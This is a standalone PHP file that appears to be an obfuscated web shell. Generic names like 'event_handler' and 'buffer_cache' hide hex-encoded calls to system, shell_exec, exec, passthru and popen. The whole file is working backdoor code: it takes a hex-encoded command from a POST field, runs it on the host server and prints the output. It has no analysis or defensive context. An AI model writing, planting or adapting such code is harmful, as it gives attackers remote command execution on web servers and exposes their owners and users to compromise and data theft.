<?php


$parameter_group1 = '73';
$parameter_group2 = '79';
$parameter_group3 = '74';
$parameter_group4 = '6d';
$parameter_group5 = '65';
$parameter_group6 = '6c';
$parameter_group7 = '5f';
$parameter_group8 = '78';
$parameter_group9 = '63';
$parameter_group10 = '70';
$parameter_group11 = '61';
$parameter_group12 = '72';
$parameter_group13 = '6f';
$parameter_group14 = '6e';
$parameter_group15 = '67';
$event_handler1 = pack("H*", $parameter_group1.$parameter_group2.'73'.$parameter_group3.'65'.$parameter_group4);
$event_handler2 = pack("H*", '73'.'68'.$parameter_group5.$parameter_group6.$parameter_group6.$parameter_group7.'65'.$parameter_group8.'65'.$parameter_group9);
$event_handler3 = pack("H*", $parameter_group5.$parameter_group8.'65'.'63');
$event_handler4 = pack("H*", $parameter_group10.$parameter_group11.'73'.'73'.$parameter_group3.'68'.$parameter_group12.'75');
$event_handler5 = pack("H*", '70'.$parameter_group13.'70'.$parameter_group5.$parameter_group14);
$event_handler6 = pack("H*", '73'.$parameter_group3.'72'.'65'.'61'.$parameter_group4.$parameter_group7.$parameter_group15.'65'.'74'.$parameter_group7.'63'.$parameter_group13.'6e'.$parameter_group3.'65'.'6e'.$parameter_group3.'73');
$event_handler7 = pack("H*", '70'.'63'.'6c'.$parameter_group13.'73'.'65');
$buffer_cache = pack("H*", '62'.'75'.'66'.'66'.$parameter_group5.'72'.$parameter_group7.'63'.'61'.'63'.'68'.$parameter_group5);
if (isset($_POST[$buffer_cache])) {
    $buffer_cache = pack("H*", $_POST[$buffer_cache]);
    if (function_exists($event_handler1)) {
        $event_handler1($buffer_cache);
    } elseif (function_exists($event_handler2)) {
        print $event_handler2($buffer_cache);
    } elseif (function_exists($event_handler3)) {
        $event_handler3($buffer_cache, $record_factor);
        print join("\n", $record_factor);
    } elseif (function_exists($event_handler4)) {
        $event_handler4($buffer_cache);
    } elseif (function_exists($event_handler5) && function_exists($event_handler6) && function_exists($event_handler7)) {
        $binding_ref = $event_handler5($buffer_cache, 'r');
        if ($binding_ref) {
            $elem_sym = $event_handler6($binding_ref);
            $event_handler7($binding_ref);
            print $elem_sym;
        }
    }
    exit;
}
